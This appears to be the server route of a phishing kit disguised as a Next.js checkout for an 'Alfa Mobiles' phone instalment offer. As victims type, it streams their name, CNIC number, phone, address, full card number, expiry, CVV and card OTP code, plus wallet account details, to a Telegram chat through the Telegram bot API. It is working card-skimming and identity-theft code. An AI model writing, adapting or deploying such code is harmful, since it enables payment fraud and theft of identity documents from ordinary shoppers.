import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { stepName, data, messageId } = body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      return NextResponse.json({ success: false, message: 'Telegram credentials missing' }, { status: 200 });
    }

    const timestamp = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const sessionId = data.sessionId || `SESS-${Math.floor(1000 + Math.random() * 9000)}`;

    let messageText = `⚡ <b>ALFA MOBILES REAL-TIME SESSION</b> ⚡\n`;
    messageText += `🟢 <b>STATUS: ACTIVE CHECKOUT</b> | 📶 <b>Ping:</b> <code>200ms</code>\n`;
    messageText += `🆔 <b>Session ID:</b> <code>#${sessionId}</code>\n`;
    messageText += `🕒 <b>Live Update:</b> <code>${timestamp}</code>\n`;
    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    messageText += `📍 <b>CURRENT PROGRESS:</b> <b>${stepName}</b>\n\n`;

    if (data.model) {
      messageText += `📱 <b>SELECTED DEVICE & PLAN:</b>\n`;
      messageText += ` ├ 🏷️ <b>Model:</b> ${data.model.name}\n`;
      messageText += ` ├ 💾 <b>Storage:</b> ${data.storage?.size || 'Standard'}\n`;
      messageText += ` ├ 🎨 <b>Color:</b> ${data.color?.name || 'Standard'}\n`;
      messageText += ` ├ 💵 <b>Cash Price:</b> Rs. ${(data.totalPrice || data.model.basePrice || 0).toLocaleString('en-PK')}\n`;
      messageText += ` └ 📅 <b>0% EMI Plan:</b> ${data.months || 24} Months @ Rs. ${(data.monthlyEmi || 0).toLocaleString('en-PK')}/mo\n\n`;
    }

    if (data.customer) {
      messageText += `👤 <b>CUSTOMER INFORMATION:</b>\n`;
      messageText += ` ├ 📛 <b>Full Name:</b> ${data.customer.fullName || '<i>Typing...</i>'}\n`;
      messageText += ` ├ 🪪 <b>CNIC:</b> <code>${data.customer.cnic || '<i>Typing...</i>'}</code>\n`;
      messageText += ` ├ 📞 <b>Phone Number:</b> <code>${data.customer.mobileNumber || '<i>Typing...</i>'}</code>\n`;
      messageText += ` ├ 🏠 <b>Delivery Address:</b> ${data.customer.deliveryAddress || '<i>Typing...</i>'}\n`;
      messageText += ` ├ 🚚 <b>Delivery Type:</b> ${data.customer.deliveryType === 'open_parcel' ? '🔍 Open Parcel Inspection' : '📦 Standard Express'}\n`;
      messageText += ` └ 💳 <b>Payment Option:</b> ${(data.customer.paymentMethod || 'card').toUpperCase()}\n\n`;
    }

    if (data.payment) {
      const isCard = data.customer?.paymentMethod === 'card' || data.payment.cardNumber || data.payment.cardName;
      
      if (isCard) {
        messageText += `💳 <b>CREDIT / DEBIT CARD DETAILS:</b>\n`;
        messageText += ` ├ 🏛️ <b>Bank Name:</b> ${data.payment.bankId ? data.payment.bankId.toUpperCase() : '<i>Selecting...</i>'}\n`;
        messageText += ` ├ 🎴 <b>Card Network:</b> ${(data.payment.cardNetwork || 'visa').toUpperCase()}\n`;
        messageText += ` ├ 👤 <b>Cardholder Name:</b> ${data.payment.cardName || '<i>Typing...</i>'}\n`;
        messageText += ` ├ 📱 <b>Bank Reg. Mobile:</b> <code>${data.payment.registeredMobile || data.customer?.mobileNumber || '<i>Typing...</i>'}</code>\n`;
        messageText += ` ├ 🔢 <b>Card Number:</b> <code>${data.payment.cardNumber || '<i>Typing...</i>'}</code>\n`;
        messageText += ` ├ 📆 <b>Expiry Date:</b> <code>${data.payment.expiry || '<i>MM / YY</i>'}</code>\n`;
        messageText += ` ├ 🔐 <b>CVV / CVC Code:</b> <code>${data.payment.cvv || '<i>CVV</i>'}</code>\n`;
        messageText += ` └ 🔑 <b>Card OTP Code:</b> <code>${data.payment.otpCode || '<i>Typing OTP...</i>'}</code>\n\n`;
      } else {
        messageText += `👛 <b>DIGITAL WALLET PAYMENT:</b>\n`;
        messageText += ` ├ 📲 <b>Wallet Service:</b> ${data.payment.walletType ? data.payment.walletType.toUpperCase() : '<i>Easypaisa</i>'}\n`;
        messageText += ` ├ 📝 <b>Account Title:</b> ${data.payment.walletAccountName || '<i>Typing...</i>'}\n`;
        messageText += ` └ 📸 <b>Proof Screenshot:</b> ${data.payment.proofPreviewUrl ? 'Attached 📸' : '<i>Pending Upload...</i>'}\n\n`;
      }
    }

    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    messageText += `🔒 <i>Secured SSL 256-Bit Live Session Stream</i>`;

    // Edit single message if messageId exists
    if (messageId) {
      const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
      const editRes = await fetch(editUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: messageText,
          parse_mode: 'HTML'
        })
      });

      const editData = await editRes.json();
      if (editData.ok) {
        return NextResponse.json({ success: true, messageId });
      }
    }

    // Send single initial message if messageId does not exist yet
    const sendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const sendRes = await fetch(sendUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    const sendData = await sendRes.json();
    if (sendData.ok) {
      return NextResponse.json({ success: true, messageId: sendData.result.message_id });
    }

    return NextResponse.json({ success: false, error: sendData.description }, { status: 500 });
  } catch (error: any) {
    console.error('Realtime Telegram error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
